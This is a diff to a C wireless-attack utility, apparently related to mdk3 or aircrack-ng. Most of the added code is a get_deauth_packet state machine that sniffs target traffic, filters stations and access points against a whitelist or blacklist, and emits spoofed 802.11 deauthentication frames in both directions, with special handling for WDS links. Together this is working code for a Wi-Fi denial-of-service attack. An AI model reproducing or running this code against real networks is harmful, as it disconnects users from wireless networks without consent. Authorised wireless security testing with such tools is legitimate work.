@@ -185,7 +185,7 @@ void print_packet(uchar *h80211, int buffer_size)
 //      a => Access Point
 //      b => BSSID
 // http://www.aircrack-ng.org/doku.php?id=wds
-uchar *get_macs_from_packet(char type, uchar *packet)
+uchar *get_macs_from_packet(char type, uchar *packet, int *is_wds)
 {
     uchar *bssid, *station, *access_point;
 
@@ -200,6 +200,7 @@ uchar *get_macs_from_packet(char type, uchar *packet)
         bssid = packet + 4;
         station = packet + 10;
         access_point = packet + 16;
+        *is_wds = 0;
     }
 
     // FromDS packet
@@ -208,6 +209,7 @@ uchar *get_macs_from_packet(char type, uchar *packet)
         station = packet + 4;
         bssid = packet + 10;
         access_point = packet + 16;
+        *is_wds = 0;
     }
 
     // WDS packet
@@ -216,6 +218,7 @@ uchar *get_macs_from_packet(char type, uchar *packet)
         station = packet + 4;
         bssid = packet + 10;
         access_point = packet + 4;
+        *is_wds = 1;
     }
 
     switch (type)
@@ -390,7 +393,7 @@ void load_list_file(const char *filename)
     fclose(file);
 }
 
-int is_whitelisted(uchar *mac)
+int is_in_list(uchar *mac)
 {
     int t;
 
@@ -403,6 +406,59 @@ int is_whitelisted(uchar *mac)
     return 0;
 }
 
+struct packet get_deauth_packet(int *state)
+{
+    uchar * sniffed_packet_data = NULL;
+    int is_wds = 0;
+    uchar * mac_access_point = NULL;
+    uchar * mac_bssid = NULL;
+    uchar * mac_station = NULL;
+    switch (*state)
+    {
+    case 0:
+        while(1)
+        {
+            sniffed_packet_data = get_target_deauth();
+            mac_access_point = get_macs_from_packet('a', sniffed_packet_data, &is_wds);
+            mac_station = get_macs_from_packet('s', sniffed_packet_data, &is_wds);
+            mac_bssid = get_macs_from_packet('b', sniffed_packet_data, &is_wds);
+            if (
+                    (use_list == 1 && !is_in_list(mac_access_point) && !is_in_list(mac_station))
+                    ||
+                    (use_list == 2 && (is_in_list(mac_access_point) || is_in_list(mac_station)))
+                )
+            {
+                    continue;
+            }
+
+            *state = 1;
+            return create_deauth_frame(mac_access_point, mac_station, mac_bssid, 1);
+        }
+    case 1:
+        *state = 2;
+        if (is_wds)
+        {
+            *state = 4;
+        }
+        return create_deauth_frame(mac_access_point, mac_station, mac_bssid, 0);
+    case 2:
+        *state = 3;
+        return create_deauth_frame(mac_station, mac_access_point, mac_bssid, 1);
+    case 3:
+        *state = 0;
+        return create_deauth_frame(mac_station, mac_access_point, mac_bssid, 0);
+    case 4:
+        *state = 5;
+        return create_deauth_frame(mac_station, mac_bssid, mac_access_point, 1);
+    case 5:
+        *state = 0;
+        return create_deauth_frame(mac_station, mac_bssid, mac_access_point, 0);
+    }
+
+    // We can never reach this part of code unless somebody messes around with memory
+    // But just to make gcc NOT complain...
+    return create_deauth_frame(mac_station, mac_access_point, mac_bssid, 0);
+}
 void print_help()
 {
     printf(
@@ -485,8 +541,8 @@ int main(int argc, const char *argv[])
     while (1)
     {
         read_packet(packet_data, MAX_PACKET_LENGTH);
-        if (!memcmp(bssid, get_macs_from_packet('b', packet_data), MAC_LENGTH) ||
-            !memcmp(bssid, get_macs_from_packet('a', packet_data), MAC_LENGTH))
+        if (!memcmp(bssid, get_macs_from_packet('b', packet_data, &t), MAC_LENGTH) ||
+            !memcmp(bssid, get_macs_from_packet('a', packet_data, &t), MAC_LENGTH) )
         {
             print_packet(packet_data, MAX_PACKET_LENGTH);
         }
